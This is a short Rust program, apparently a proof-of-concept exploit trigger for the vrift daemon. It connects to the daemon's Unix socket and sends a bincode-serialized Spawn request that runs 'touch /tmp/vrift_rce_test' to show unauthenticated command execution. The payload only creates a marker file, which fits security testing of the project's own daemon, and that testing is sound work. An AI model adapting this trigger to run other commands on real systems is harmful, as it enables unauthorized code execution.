use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::UnixStream;
use vrift_ipc::{VeloRequest, VeloResponse};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let socket_path = "/tmp/vrift.sock";
    let _victim_file = "/tmp/vrift_victim_file";

    println!("--- Daemon Exploit Trigger (Rust) ---");

    let mut stream = UnixStream::connect(socket_path).await?;
    println!("[+] Connected to daemon.");

    // VeloRequest::Spawn { command, env, cwd }
    let req = VeloRequest::Spawn {
        command: vec!["touch".to_string(), "/tmp/vrift_rce_test".to_string()],
        env: vec![],
        cwd: "/tmp".to_string(),
    };

    let req_bytes = bincode::serialize(&req)?;
    let req_len = (req_bytes.len() as u32).to_le_bytes();

    println!("[+] Sending Spawn request (touch /tmp/vrift_rce_test)...");
    stream.write_all(&req_len).await?;
    stream.write_all(&req_bytes).await?;

    let mut resp_len_buf = [0u8; 4];
    stream.read_exact(&mut resp_len_buf).await?;
    let resp_len = u32::from_le_bytes(resp_len_buf) as usize;

    let mut resp_buf = vec![0u8; resp_len];
    stream.read_exact(&mut resp_buf).await?;

    let resp: VeloResponse = bincode::deserialize(&resp_buf)?;
    println!("[+] Received response: {:?}", resp);

    Ok(())
}
